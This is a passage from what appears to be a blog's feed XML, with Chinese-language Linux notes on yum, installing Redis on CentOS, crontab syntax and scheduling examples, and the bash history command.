    <content type="html"><![CDATA[<span id="more"></span><h3 id="查看yum安装的服务"><a href="#查看yum安装的服务" class="headerlink" title="查看yum安装的服务"></a>查看yum安装的服务</h3><p>yum list installed </p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[root<span class="hljs-title">@localhost</span> tmp]# yum list installed <br>已加载插件：fastestmirror<br>Loading mirror speeds from cached hostfile<br> * epel: mirrors.bfsu.edu.cn<br>已安装的软件包<br>NetworkManager.<span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span>                                  <span class="hljs-number">1</span>:<span class="hljs-number">1.0</span>.<span class="hljs-number">6</span><span class="hljs-number">-27</span>.el<span class="hljs-number">7</span>           <span class="hljs-title">@anaconda</span><br>cpp.<span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span>                                             <span class="hljs-number">4.8</span>.<span class="hljs-number">5</span><span class="hljs-number">-44</span>.el<span class="hljs-number">7</span>             <span class="hljs-title">@base</span>    <br>epel-<span class="hljs-keyword">release</span>.noarch                                    <span class="hljs-number">7</span><span class="hljs-number">-11</span>                     <span class="hljs-title">@extras</span>  <br>glibc.<span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span>                                           <span class="hljs-number">2.17</span><span class="hljs-number">-324</span>.el<span class="hljs-number">7</span>_<span class="hljs-number">9</span>           <span class="hljs-title">@updates</span> <br>redis.<span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span>                                           <span class="hljs-number">3.2</span>.<span class="hljs-number">12</span><span class="hljs-number">-2</span>.el<span class="hljs-number">7</span>             <span class="hljs-title">@epel</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tips</tag>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
      <tag>yum</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>redis_base</title>
    <link href="/2024/04/16/db/redis/redis_base/"/>
    <url>/2024/04/16/db/redis/redis_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a>Centos</h3><h4 id="添加-EPEL-存储库"><a href="#添加-EPEL-存储库" class="headerlink" title="添加 EPEL 存储库"></a>添加 EPEL 存储库</h4><p>sudo yum install epel-release</p><h4 id="安装Redis"><a href="#安装Redis" class="headerlink" title="安装Redis"></a>安装Redis</h4><p>sudo yum install redis</p><p>默认安装的版本为 3.2.12</p><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2>]]></content>
    
    
    <categories>
      
      <category>db</category>
      
      <category>redis</category>
      
    </categories>
    
    
    <tags>
      
      <tag>db</tag>
      
      <tag>redis</tag>
      
      <tag>base</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>crontab</title>
    <link href="/2024/04/03/yunwei/yunweicommands/Linuxcommands/crontab/"/>
    <url>/2024/04/03/yunwei/yunweicommands/Linuxcommands/crontab/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>crontab(定时任务)，是系统为用户提供定时执行任务的功能。</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>不同版本的系统，都会在通用语法的之后再扩展一些语法</p><h3 id="crontab命令语法："><a href="#crontab命令语法：" class="headerlink" title="crontab命令语法："></a>crontab命令语法：</h3><p><strong>crontab [-u user] [-l | -r | -e] [-i] [-s]</strong></p><p><strong>-u user</strong>：指定用户，不指定表示当前用户，只有管理员才可以指定用户，普通用户使用-u会出现如下提示</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[test<span class="hljs-variable">@110</span> /]<span class="hljs-variable">$ </span>crontab -u apache -l<br>must be privileged to <span class="hljs-keyword">use</span> -u<br></code></pre></td></tr></table></figure><p><strong>-l</strong>：list的意思，查看定时任务列表</p><p><strong>-e</strong>：edit的意思，编辑指定定时任务，退出编辑状态之后会自动重新加载（reload）定时任务</p><p><strong>-r</strong>：remove的意思，删除定时任务，如果有权限就会直接删除</p><p><strong>-i</strong>：和-r搭配使用，会出现提示是否删除，输入y&#x2F;Y就会删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@110 root]$ crontab -r -i<br>crontab: really delete <span class="hljs-built_in">test</span><span class="hljs-string">&#x27;s crontab?</span><br></code></pre></td></tr></table></figure><p>centos7扩展语法，增加了对集群的支持，-c&#x2F;-n host</p><p>centos8扩展语法，增加了对集群的支持，-c&#x2F;-n host</p><p><strong>-V</strong>：显示版本</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[root<span class="hljs-title">@localhost</span> /]# cat /etc/redhat-<span class="hljs-keyword">release</span> <br>Red Hat Enterprise Linux <span class="hljs-keyword">release</span> <span class="hljs-number">8.3</span> (Ootpa)<br></code></pre></td></tr></table></figure><h2 id="crontab格式"><a href="#crontab格式" class="headerlink" title="crontab格式"></a>crontab格式</h2><h4 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h4><p>* * * * * command(要运行的命令)</p><p># +—————- minute  分钟(0 - 59) </p><p># |  +————- hour    小时(0 - 23) </p><p># |  |  +———- day     日期(1 - 31) </p><p># |  |  |  +——- month   月份(1 - 12) </p><p># |  |  |  |  +—- week    星期(0 - 7) (星期天&#x3D;0 or 7) </p><p># |  |  |  |  | # *  *  *  *  *  要运行的命令**</p><h4 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h4><p>* 表示允许范围内任意数字</p><p>&#x2F; 表示每单元，*&#x2F;5:每5个单元</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">*<span class="hljs-string">/5</span> * * * * <span class="hljs-keyword">ls</span> <span class="hljs-comment">#每五分钟执行一次ls</span><br></code></pre></td></tr></table></figure><p>a-b 表示从a-b的数字</p><p>a,b,c 表示在a,b,c的时间点执行</p><p><strong>示例:</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">每天早上6点追加一条字符串到一个文本。<br>0 6 * * * <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Good morning.&quot;</span> &gt;&gt; <span class="hljs-string">/tmp/test.txt</span><br><br>每两个小时追加一条字符串一个文本。-<br>0 *<span class="hljs-string">/2</span> * * * <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;two hours append text.&quot;</span> &gt;&gt; <span class="hljs-string">/tmp/test.txt</span><br><br>晚上11点到早上8点之间每两个小时，早上八点<br>0 23-7/2，8 * * * <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;sleep&quot;</span> &gt;&gt; <span class="hljs-string">/tmp/test.txt</span><br><br>每个月的4号和每个礼拜的礼拜一到礼拜三的早上11点<br>0 11 4 * 1-3 <span class="hljs-keyword">command</span> line<br><br>1月1日早上4点<br>0 4 1 1 * <span class="hljs-keyword">command</span> line<br><br>每月每天每小时的第 0 分钟执行一次 <span class="hljs-string">/bin/ls</span><br>0 * * * * <span class="hljs-string">/bin/ls</span><br><br>在 12 月内, 每天的早上 6 点到 12 点中，每隔 20 分钟执行一次 <span class="hljs-string">/usr/bin/backup</span><br>*<span class="hljs-string">/20</span> 6-12 * 12 * <span class="hljs-string">/usr/bin/backup</span><br><br>周一到周五每天下午 5<span class="hljs-function">:00</span> 寄一封信给 alex_mail_name :<br>0 17 * * 1-5 mail -s <span class="hljs-string">&quot;hi&quot;</span> alex_mail_name &lt; <span class="hljs-string">/tmp/maildata</span><br><br>每月每天的午夜 0 点 20 分, 2 点 20 分, 4 点 20 分<span class="hljs-string">....</span>执行 <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;haha&quot;</span><br>20 0-23/2 * * * <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;haha&quot;</span><br><br>晚上11点到早上8点之间每两个小时，早上8点,显示时间<br>0 23-7/2，8 * * * date<br></code></pre></td></tr></table></figure><h2 id="不同级别crontab"><a href="#不同级别crontab" class="headerlink" title="不同级别crontab"></a>不同级别crontab</h2><h4 id="用户crontab"><a href="#用户crontab" class="headerlink" title="用户crontab"></a>用户crontab</h4><p>&#x2F;var&#x2F;spool&#x2F;cron目录</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@iZbp1191gh7vw52537lyxrZ cron]<span class="hljs-comment"># ls -lat /var/spool/cron</span><br>total 16<br>drwx------.<span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Jun<span class="hljs-number"> 14 </span>11:35 .<br>-rw------- <span class="hljs-number"> 1 </span>test test  <span class="hljs-number"> 20 </span>Jun<span class="hljs-number"> 14 </span>11:35 test<br>-rw------- <span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 20 </span>Jun <span class="hljs-number"> 6 </span>13:46 root<br>drwxr-xr-x.<span class="hljs-number"> 9 </span>root root<span class="hljs-number"> 4096 </span>Oct<span class="hljs-number"> 15 </span><span class="hljs-number"> 2017 </span>..<br></code></pre></td></tr></table></figure><p>目录权限：</p><p>​drwx——,也就是700，所属组为root:root,表示只有root有操作权限</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">drwx</span>------. <span class="hljs-number">2</span> root root <span class="hljs-number">4096</span> Jun <span class="hljs-number">14</span> <span class="hljs-number">11</span>:<span class="hljs-number">25</span> cron/<br></code></pre></td></tr></table></figure><p>文件权限：</p><p>​-rw——-，也就是600，所属组为对应用户，表示只有对应对应用户有查看编辑权限（root,有所有权限）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-rw-------  1 <span class="hljs-built_in">test</span> <span class="hljs-built_in">test</span>   20 Jun 14 11:35 <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><h4 id="主系统crontab"><a href="#主系统crontab" class="headerlink" title="主系统crontab"></a>主系统crontab</h4><p>&#x2F;etc&#x2F;crontab </p><p>文件权限为 -rw-r–r–，也就是644，表示任何用户都可以查看，但只有 root 可修改</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">[apache@110 cron]$ <span class="hljs-keyword">ls</span> -lat <span class="hljs-string">/etc/crontab</span><br>-rw-r<span class="hljs-params">--r--</span>. 1 root root 451 Jun 10  2014 <span class="hljs-string">/etc/crontab</span><br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ruby">[apache<span class="hljs-variable">@110</span> cron]<span class="hljs-variable">$ </span>cat /etc/crontab<br><span class="hljs-variable constant_">SHELL</span>=<span class="hljs-regexp">/bin/bash</span><br><span class="hljs-variable constant_">PATH</span>=<span class="hljs-regexp">/sbin:/bin</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/bin</span><br><span class="hljs-variable constant_">MAILTO</span>=root<br><br><span class="hljs-comment"># For details see man 4 crontabs</span><br><br><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name  command to be executed</span><br><br></code></pre></td></tr></table></figure><h4 id="周期性执行脚本目录"><a href="#周期性执行脚本目录" class="headerlink" title="周期性执行脚本目录"></a>周期性执行脚本目录</h4><p>&#x2F;etc&#x2F;cron.hourly:每小时执行</p><p>&#x2F;etc&#x2F;cron.daily:每天执行</p><p>&#x2F;etc&#x2F;cron.weekly:每周执行</p><p>&#x2F;etc&#x2F;cron.monthly:每月执行</p><p>目录权限均为drwxr-xr-x，也就是766</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">drwxr</span>-xr-x. <span class="hljs-number">2</span> root root <span class="hljs-number">4096</span> Jun <span class="hljs-number">10</span>  <span class="hljs-number">2014</span> /etc/cron.weekly<br></code></pre></td></tr></table></figure><h2 id="定时任务调用流程"><a href="#定时任务调用流程" class="headerlink" title="定时任务调用流程"></a>定时任务调用流程</h2><h5 id="centos7"><a href="#centos7" class="headerlink" title="centos7"></a>centos7</h5><p>ll &#x2F;etc&#x2F;cron.d</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tap">[apache@110 cron.weekly]$ ll /etc/cron.d<br>total 8<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 128 </span>Aug <span class="hljs-number"> 9 </span><span class="hljs-number"> 2019 </span>0hourly<br>-rw-------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 235 </span>Apr <span class="hljs-number"> 1 </span><span class="hljs-number"> 2020 </span>sysstat<br></code></pre></td></tr></table></figure><p>cat &#x2F;etc&#x2F;cron.d&#x2F;0hourly</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ruby">[apache<span class="hljs-variable">@110</span> cron.weekly]<span class="hljs-variable">$ </span>cat /etc/cron.d/0hourly<br><span class="hljs-comment"># Run the hourly jobs</span><br><span class="hljs-variable constant_">SHELL</span>=<span class="hljs-regexp">/bin/bash</span><br><span class="hljs-variable constant_">PATH</span>=<span class="hljs-regexp">/sbin:/bin</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/bin</span><br><span class="hljs-variable constant_">MAILTO</span>=root<br><span class="hljs-number">01</span> * * * * root run-parts /etc/cron.hourly<br></code></pre></td></tr></table></figure><p>ll &#x2F;etc&#x2F;cron.hourly&#x2F;</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tap">(base) [root@110 cron]<span class="hljs-comment"># ll /etc/cron.hourly/</span><br>total 4<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 392 </span>Aug <span class="hljs-number"> 9 </span><span class="hljs-number"> 2019 </span>0anacron<br></code></pre></td></tr></table></figure><p>cat &#x2F;etc&#x2F;cron.hourly&#x2F;0anacron</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk">(base) [root@<span class="hljs-number">110</span> cron]<span class="hljs-comment"># cat /etc/cron.hourly/0anacron</span><br><span class="hljs-comment">#!/bin/sh</span><br><span class="hljs-comment"># Check whether 0anacron was run today already</span><br><span class="hljs-keyword">if</span> test -r <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/anacron/</span>cron.daily; then<br>    day=`cat <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/anacron/</span>cron.daily`<br>fi<br><span class="hljs-keyword">if</span> [ `date +%Y%m%d` = <span class="hljs-string">&quot;$day&quot;</span> ]; then<br>    <span class="hljs-keyword">exit</span> <span class="hljs-number">0</span>;<br>fi<br><br><span class="hljs-comment"># Do not run jobs when on battery power</span><br><span class="hljs-keyword">if</span> test -x <span class="hljs-regexp">/usr/</span>bin/on_ac_power; then<br>    <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/on_ac_power &gt;/</span>dev/null <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> test $? -eq <span class="hljs-number">1</span>; then<br>    <span class="hljs-keyword">exit</span> <span class="hljs-number">0</span><br>    fi<br>fi<br><span class="hljs-regexp">/usr/</span>sbin/anacron -s<br></code></pre></td></tr></table></figure><p>cat &#x2F;etc&#x2F;anacrontab</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs ruby">(base) [root<span class="hljs-variable">@110</span> cron]<span class="hljs-comment"># cat /etc/anacrontab</span><br><span class="hljs-comment"># /etc/anacrontab: configuration file for anacron</span><br><br><span class="hljs-comment"># See anacron(8) and anacrontab(5) for details.</span><br><br><span class="hljs-variable constant_">SHELL</span>=<span class="hljs-regexp">/bin/sh</span><br><span class="hljs-variable constant_">PATH</span>=<span class="hljs-regexp">/sbin:/bin</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/bin</span><br><span class="hljs-variable constant_">MAILTO</span>=root<br><span class="hljs-comment"># the maximal random delay added to the base delay of the jobs</span><br><span class="hljs-variable constant_">RANDOM_DELAY</span>=<span class="hljs-number">45</span><br><span class="hljs-comment"># the jobs will be started during the following hours only</span><br><span class="hljs-variable constant_">START_HOURS_RANGE</span>=<span class="hljs-number">3</span>-<span class="hljs-number">22</span><br><br><span class="hljs-comment">#period in days   delay in minutes   job-identifier   command</span><br><span class="hljs-number">1</span>       <span class="hljs-number">5</span>       cron.daily              nice run-parts /etc/cron.daily<br><span class="hljs-number">7</span>       <span class="hljs-number">25</span>      cron.weekly             nice run-parts /etc/cron.weekly<br><span class="hljs-variable">@monthly</span> <span class="hljs-number">45</span>     cron.monthly            nice run-parts /etc/cron.monthly<br></code></pre></td></tr></table></figure><p>cat &#x2F;etc&#x2F;anacrontab</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs ruby">(base) [root<span class="hljs-variable">@110</span> cron]<span class="hljs-comment"># cat /etc/anacrontab</span><br><span class="hljs-comment"># /etc/anacrontab: configuration file for anacron</span><br><br><span class="hljs-comment"># See anacron(8) and anacrontab(5) for details.</span><br><br><span class="hljs-variable constant_">SHELL</span>=<span class="hljs-regexp">/bin/sh</span><br><span class="hljs-variable constant_">PATH</span>=<span class="hljs-regexp">/sbin:/bin</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/bin</span><br><span class="hljs-variable constant_">MAILTO</span>=root<br><span class="hljs-comment"># the maximal random delay added to the base delay of the jobs</span><br><span class="hljs-variable constant_">RANDOM_DELAY</span>=<span class="hljs-number">45</span><br><span class="hljs-comment"># the jobs will be started during the following hours only</span><br><span class="hljs-variable constant_">START_HOURS_RANGE</span>=<span class="hljs-number">3</span>-<span class="hljs-number">22</span><br><br><span class="hljs-comment">#period in days   delay in minutes   job-identifier   command</span><br><span class="hljs-number">1</span>       <span class="hljs-number">5</span>       cron.daily              nice run-parts /etc/cron.daily<br><span class="hljs-number">7</span>       <span class="hljs-number">25</span>      cron.weekly             nice run-parts /etc/cron.weekly<br><span class="hljs-variable">@monthly</span> <span class="hljs-number">45</span>     cron.monthly            nice run-parts /etc/cron.monthly<br></code></pre></td></tr></table></figure><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>crontab -l 无法查看到 &#x2F;etc&#x2F;cron.daily 目录下的定时任务</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>history</title>
    <link href="/2024/04/03/yunwei/yunweicommands/Linuxcommands/history/"/>
    <url>/2024/04/03/yunwei/yunweicommands/Linuxcommands/history/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="命令语法"><a href="#命令语法" class="headerlink" title="命令语法"></a>命令语法</h2><h3 id="history-num-显示指定条数的最新历史记录"><a href="#history-num-显示指定条数的最新历史记录" class="headerlink" title="history num 显示指定条数的最新历史记录"></a>history num 显示指定条数的最新历史记录</h3><p>history num</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# history 5<br>  106  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 10:54:02  ls<br>  107  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 10:54:07  cat /etc/bashrc<br>  108  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 10:54:55  vim ~/.bashrc<br>  109  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 10:55:55  man history<br>  110  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 10:58:48  history 5<br></code></pre></td></tr></table></figure><h3 id="num-重复执行指定记录"><a href="#num-重复执行指定记录" class="headerlink" title="!num 重复执行指定记录"></a>!num 重复执行指定记录</h3><p>计数都是从1开始的</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># history 5</span><br>  113  root 2022-08-14 11<span class="hljs-function">:01</span><span class="hljs-function">:48</span>  <span class="hljs-keyword">ls</span><br>  114  root 2022-08-14 11<span class="hljs-function">:02</span><span class="hljs-function">:02</span>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot; 1 &quot;</span> &gt; 1.txt<br>  115  root 2022-08-14 11<span class="hljs-function">:02</span><span class="hljs-function">:03</span>  <span class="hljs-keyword">ls</span><br>  116  root 2022-08-14 11<span class="hljs-function">:02</span><span class="hljs-function">:08</span>  <span class="hljs-keyword">history</span><br>  117  root 2022-08-14 11<span class="hljs-function">:02</span><span class="hljs-function">:15</span>  <span class="hljs-keyword">history</span> 5<br>[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># !115</span><br><span class="hljs-keyword">ls</span><br>1.txt<br>[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h3 id="num-从列表末尾开始计数指定第num行命令"><a href="#num-从列表末尾开始计数指定第num行命令" class="headerlink" title="!-num 从列表末尾开始计数指定第num行命令"></a>!-num 从列表末尾开始计数指定第num行命令</h3><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# history 10<br>   96  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:02:15  history 5<br>   97  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:02:26  ls<br>   98  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:05:46  history 5<br>   99  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:06:06  history<br>  100  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:06:20  ls<br>  101  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:36  hi<br>  102  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:41  hitory<br>  103  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:44  history<br>  104  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:59  history 6<br>  105  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:08:04  history 10<br>[root@iZbp1191gh7vw52537lyxrZ ~]# !<span class="hljs-string">-6</span><br>ls<br>1.txt<br></code></pre></td></tr></table></figure><h3 id="执行上一条命令"><a href="#执行上一条命令" class="headerlink" title="!! 执行上一条命令"></a>!! 执行上一条命令</h3><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# history 10<br>   96  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:02:15  history 5<br>   97  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:02:26  ls<br>   98  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:05:46  history 5<br>   99  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:06:06  history<br>  100  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:06:20  ls<br>  101  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:36  hi<br>  102  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:41  hitory<br>  103  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:44  history<br>  104  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:59  history 6<br>  105  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:08:04  history 10<br>[root@iZbp1191gh7vw52537lyxrZ ~]# !<span class="hljs-string">-6</span><br>ls<br>1.txt<br>[root@iZbp1191gh7vw52537lyxrZ ~]# !!<br>ls<br>1.txt<br></code></pre></td></tr></table></figure><h3 id="string-执行以某字符串开头的最新命令"><a href="#string-执行以某字符串开头的最新命令" class="headerlink" title="!string 执行以某字符串开头的最新命令"></a>!string 执行以某字符串开头的最新命令</h3><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 